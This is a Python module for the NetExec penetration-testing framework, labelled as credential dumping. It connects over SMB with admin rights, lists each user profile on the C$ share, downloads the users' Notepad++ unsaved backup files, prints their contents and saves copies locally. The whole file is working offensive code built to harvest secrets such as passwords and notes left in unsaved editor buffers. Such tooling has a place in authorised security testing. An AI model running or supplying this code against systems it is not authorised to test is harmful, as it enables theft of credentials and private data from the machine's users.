from dataclasses import dataclass
from datetime import datetime
from io import BytesIO
from pathlib import Path

from impacket.nt_errors import STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND
from impacket.smbconnection import SessionError
from nxc.helpers.misc import CATEGORY
from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH
from nxc.playbooks.results import ActionResult, Artifact, ResultStatus


class NXCModule:
    # Module by @Defte_
    name = "notepad++"
    description = "Extracts notepad++ unsaved files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]

    @dataclass
    class ResultData:
        files: list[dict]
        queried_users: list[str]

    result_type = ResultData

    def options(self, context, module_options):
        """No options available."""

    def on_admin_login(self, context, connection):
        records, queried_users, errors, artifacts = [], [], [], []
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        ignored = {name.casefold() for name in self.false_positive}
        try:
            for directory in connection.conn.listPath("C$", "Users\\*"):
                user = directory.get_longname()
                if user.casefold() in ignored or not directory.is_directory():
                    continue
                backup_dir = f"Users\\{user}\\AppData\\Roaming\\Notepad++\\backup\\"
                queried_users.append(user)
                try:
                    files = connection.conn.listPath("C$", f"{backup_dir}*")
                except SessionError as e:
                    if e.getErrorCode() in (STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND):
                        continue
                    raise
                for file in files:
                    name = file.get_longname()
                    if name.casefold() in ignored or file.is_directory():
                        continue
                    record = {"user": user, "path": backup_dir + name, "content": b"", "text": "", "complete": False, "error": None}
                    records.append(record)
                    with BytesIO() as buffer:
                        try:
                            connection.conn.getFile("C$", record["path"], buffer.write)
                            record["complete"] = True
                        except Exception as e:
                            record["error"] = str(e) or type(e).__name__
                            raise
                        finally:
                            record["content"] = buffer.getvalue()
                            record["text"] = record["content"].decode("utf-8-sig", errors="replace")
                    context.log.highlight(f"C:\\{record['path']}")
                    for line in record["text"].splitlines():
                        context.log.highlight(f"\t{line}")
                    filename = sanitize_path_component(f"{connection.host}_{user}_{stamp}_{len(records)}_{name}")
                    path = Path(NXC_PATH) / "modules" / "notepad++" / filename
                    try:
                        path.parent.mkdir(parents=True, exist_ok=True)
                        path.write_bytes(record["content"])
                        artifacts.append(Artifact(path, "notepad_backup"))
                        context.log.highlight(f"Notepad++ backup written to: {path}")
                    except Exception as e:
                        record["error"] = str(e) or type(e).__name__
                        raise
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
            context.log.fail(errors[-1])
        return ActionResult(
            "smb", self.name, connection.host,
            ResultStatus.FAILED if errors else ResultStatus.SUCCESS if records else ResultStatus.NEGATIVE,
            self.ResultData(records, queried_users), artifacts=artifacts, error="; ".join(errors) or None,
        )
